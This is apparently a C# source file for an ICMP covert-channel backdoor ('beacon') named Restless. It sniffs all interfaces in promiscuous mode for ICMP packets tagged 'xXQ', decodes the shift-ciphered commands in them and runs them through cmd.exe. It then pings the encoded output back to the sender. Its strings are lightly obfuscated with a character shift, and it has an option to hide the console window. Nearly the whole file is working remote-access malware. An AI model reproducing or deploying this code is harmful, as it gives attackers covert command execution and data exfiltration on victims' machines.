using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SharpPcap;

namespace Restless
{
    class Program
    {
        // Static values
        public static string IDentifier = "xXQ";
        public static int SHIFT = -1;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Hide
            //ShowWindow(handle, SW_HIDE);

            // Print SharpPcap version
            string ver = SharpPcap.Version.VersionString;
            // Retrieve the device list
            var devices = CaptureDeviceList.Instance;
            // If no devices were found print an error
            if (devices.Count < 1)
            {
                return;
            }
            int i = 0;
            // Scan the list printing every entry
            foreach (var dev in devices)
            {
                Thread t = new Thread(() => runn(dev));
                t.Start();
                i++;
                Console.WriteLine("Opening interface #{0}", i);
            }
            //runn(devices[4]);
        }

        public static void runn(ICaptureDevice device)
        {
            //Register our handler function to the 'packet arrival' event
            device.OnPacketArrival +=
                new PacketArrivalEventHandler(device_OnPacketArrival);

            //Open the device for capturing
            int readTimeoutMilliseconds = 1000;
            device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);

            // tcpdump filter to capture only icmp-like packets
            // "icmp" is "jdnq"
            string filter = shift("jdnq", -1);
            device.Filter = filter;

            // Start capture packets
            device.Capture();

            // Close the pcap device
            // (Note: this line will never be called since
            //  we're capturing infinite number of packets
            device.Close();
        }

        //
        /// <summary>
        /// This function uses a shift cipher
        /// </summary>
        public static string getMSG(string msg)
        {
            byte[] ba = Encoding.Default.GetBytes(msg);
            var hexString = BitConverter.ToString(ba);
            string[] hexValuesSplit = hexString.Split('-');
            var numbers = new List<char>();
            string msg2;
            foreach (string hex in hexValuesSplit)
            {
                // Convert the number expressed in base-16 to an integer.
                int value = Convert.ToInt32(hex, 16);
                int value2 = value + SHIFT;
                if (value2 > 10 && value2 < 256)
                {
                    char c = Convert.ToChar(value2);
                    numbers.Add(c);
                }
                // Get the character corresponding to the integral value.
                string stringValue = Char.ConvertFromUtf32(value);
                char charValue = (char)value;
                //Console.WriteLine("hexadecimal value = {0}, int value = {1}, char value = {2} or {3}",
                //                    hex, value, stringValue, charValue);
            }
            return string.Join("", numbers.ToArray());
        }

        public static string shift(string stringMSG, int shiftAmount)
        {
            var numbers = new List<char>();
            foreach (char c in stringMSG)
            {
                if (c > 10 && c < 256)
                {
                    int value = ((int)c) + shiftAmount;
                    char c2 = Convert.ToChar(value);
                    numbers.Add(c2);
                }
            }
            return string.Join("", numbers.ToArray());
        }


        /// <summary>
        /// Prints the time and length of each received packet
        /// </summary>
        private static void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            var msg = Encoding.Default.GetString(e.Packet.Data);
            if (msg.Contains(IDentifier))
            {
                msg = msg.Split(new[] { IDentifier }, StringSplitOptions.None).Last();
                var decodedMSG = getMSG(msg);
                Console.WriteLine("Coming msg: {0}", decodedMSG);

                // "cmd.exe" is "dne/fyf" shifted by "+1"
                Process p = execute(decodedMSG, shift("dne/fyf", -1));
                string output = p.StandardOutput.ReadToEnd();
                try
                {
                    Console.WriteLine("Output: {0}", output);
                    output = shift(output, 1);
                    Console.WriteLine("Encrypted output: {0}", output);
                    reply(sender, e, output);
                }
                catch (Exception e0)
                {
                    Console.WriteLine("-- " + e0.Message);
                }
            }
        }

        /// <summary>
        /// Echos "ip" with output as the payload.
        /// IT GOTTA BE CHANGED
        /// </summary>
        private static void classicalReply(string ip, string output)
        {
            Ping icmpClient = new Ping();
            PingOptions options = new PingOptions();
            options.DontFragment = true;
            byte[] msg5 = Encoding.UTF8.GetBytes(output);

            while (true)
            {
                PingReply reply = icmpClient.Send(ip, 60 * 1000, msg5, options);
                Thread.Sleep(500);
                break;
            }
        }

        /// <summary>
        /// This function replies to the "ip.SourceAddress" via a normal ICMP echo with
        /// the encrypted outputs. My plan is to craft an ICMP packet to reply using SharpPcap but
        /// for now,  I am just using Ping. FYI Ping follows Windows Firewall rules, thus
        /// If you don't get outputs back that doesn't mean the beacon is dead. Crafting an ICMP packet
        /// will solve this problem. But I don't have time for it now. The important part is it can
        /// receive commands and execute them with problems.
        /// </summary>
        private static void reply(object sender, CaptureEventArgs e, string output)
        {
            string[] lines = output.Split('\n');
            var packet = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);
            if (packet is PacketDotNet.EthernetPacket)
            {
                var eth = ((PacketDotNet.EthernetPacket)packet);
                //Console.WriteLine("Original Eth packet: " + eth.ToString());
                //Console.WriteLine(Encoding.Default.GetString(eth.Bytes));
                //Console.WriteLine("-------------");

                var ip = packet.Extract<PacketDotNet.IPPacket>();
                if (ip != null)
                {
                    //Console.WriteLine("Original IP packet: " + ip.ToString());

                    // classical Reply
                    classicalReply(ip.SourceAddress.ToString(), output);

                    // So far, I am using normal ICMP packets to send back the outputs.
                    // I need to remove this return and create an ICMP reply.
                    // Future work.
                    return;


                    //manipulate IP parameters
                    ip.SourceAddress = System.Net.IPAddress.Parse(ip.DestinationAddress.ToString());
                    ip.DestinationAddress = System.Net.IPAddress.Parse(ip.SourceAddress.ToString());
                    Console.WriteLine(Encoding.Default.GetString(ip.Bytes));
                    Console.WriteLine("-------------");

                    // var packet2 = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, ip.ParentPacket.ParentPacket.Bytes);
                    //var packet2 = ip.ParentPacket.ParentPacket.PayloadPacket;
                    //ip.TimeToLive = 11;
                    var icmp = packet.Extract<PacketDotNet.IcmpV4Packet>();
                    Console.WriteLine(Encoding.Default.GetString(icmp.Bytes));
                    Console.WriteLine("-------------");


                    //Console.WriteLine(icmp.ParentPacket.ToString());
                    Console.WriteLine(icmp.PayloadData.ToString());
                    Console.WriteLine(Encoding.Default.GetString(icmp.PayloadData));
                    Console.WriteLine("-------------");



                    var devices = CaptureDeviceList.Instance;
                    int i = 0;
                    //var dev;
                    foreach (var dev2 in devices)
                    {
                        var dev = devices[0];
                        i++;
                        // Stop before the last one
                        Console.WriteLine(i);

                        //var dev = devices[1];
                        try
                        {
                            //Open the device
                            dev.Open();

                            try
                            {
                                Byte[] array = new Byte[64];
                                Array.Clear(array, 0, array.Length);

                                //Send the packet out the network device
                                //foreach (string line in lines) {
                                dev.SendPacket(array);
                                //}

                                Console.WriteLine("-- Packet sent successfuly.");
                            }
                            catch (Exception e2)
                            {
                                Console.WriteLine("-- " + e2.Message);
                            }

                            //Close the pcap device
                            dev.Close();

                            // This is needed otherwise a race condition will occur
                            Thread.Sleep(2000);
                        }
                        catch (Exception e3)
                        {
                            Console.WriteLine("-- " + e3.Message);
                        }
                    }

                }
            }

        }

        /// <summary>
        /// Executes the command then returns the process object.
        /// </summary>
        static Process execute(string command, string fileName)
        {
            Process process = new Process();
            process.StartInfo.FileName = fileName;
            process.StartInfo.Arguments = shift("0d!", -1) + command; // Note the /c command (*)
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.Start();
            return process;
        }
    }
}
